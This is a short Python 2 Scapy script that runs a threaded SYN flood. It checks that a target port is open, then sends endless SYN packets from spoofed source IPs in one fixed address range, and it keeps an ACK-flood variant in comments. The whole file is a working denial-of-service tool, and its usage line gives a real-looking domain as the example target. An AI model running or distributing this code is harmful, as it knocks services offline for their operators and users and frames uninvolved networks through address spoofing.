from scapy.all import *
from time import sleep
import thread
import os
import sys

if len(sys.argv) != 4:
	print "Usage - ./TCP-Flood.py [Target-IP] [Port Number] [Threads]"
	print "Example - ./TCP-Flood.py shoreqs.top 80 32"
	sys.exit()

target = str(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])

## Make sure target port is activated
response = sr1(IP(dst=target)/TCP(sport=2333,dport=dstport,flags='S'),timeout=1,verbose=0)
assert response[TCP].ack == 1 and response[TCP].flags == 18 ,'Target port is not activated'

## Generate IP Randomly...
IPTable = ['115.27.'+str(i)+'.'+str(j) for i in range(2,255) for j in range(2,255)]

def TCPFlood(target,dstport):
	while True:
		try:
			randPort = random.randint(0,65535)
			randIP = IPTable[random.randint(0,24515)]
			# ACK Flood ?
			# response = sr1(IP(dst=target)/TCP(sport=randPort,dport=dstport,flags='S'),timeout=1,verbose=0)
			# send(IP(dst=target)/TCP(dport=dstport,sport=randPort,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)
			# SYN Flood ?
			send(IP(src=randIP,dst=target)/TCP(sport=randPort,dport=dstport,flags='S'),timeout=1,verbose=0)
		except:
			pass

## Spin up multiple threads to launch the attack
print "use Ctrl+C to stop the attack"
for x in range(0,threads):
	thread.start_new_thread(TCPFlood, (target,dstport))

## Make it go FOREVER (...or at least until Ctrl+C)
while True:
	sleep(1)
